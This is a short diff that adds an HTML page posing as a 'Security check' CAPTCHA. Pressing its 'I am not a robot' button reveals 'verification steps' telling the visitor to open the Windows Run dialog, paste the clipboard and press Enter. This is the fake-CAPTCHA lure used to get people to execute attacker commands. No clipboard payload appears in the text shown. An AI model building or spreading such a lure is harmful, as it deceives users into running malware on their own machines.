@@ -1,0 +1,9 @@
+<!doctype html><meta charset="utf-8"><title>Reveal</title>
+<h1>Security check</h1>
+<button id="robot">I am not a robot</button>
+<div id="steps" style="display:none">Verification steps: 1. Press Windows Key + R 2. Press CTRL + V 3. Press Enter</div>
+<script>
+document.getElementById('robot').addEventListener('click', () => {
+  document.getElementById('steps').style.display = 'block';
+});
+</script>
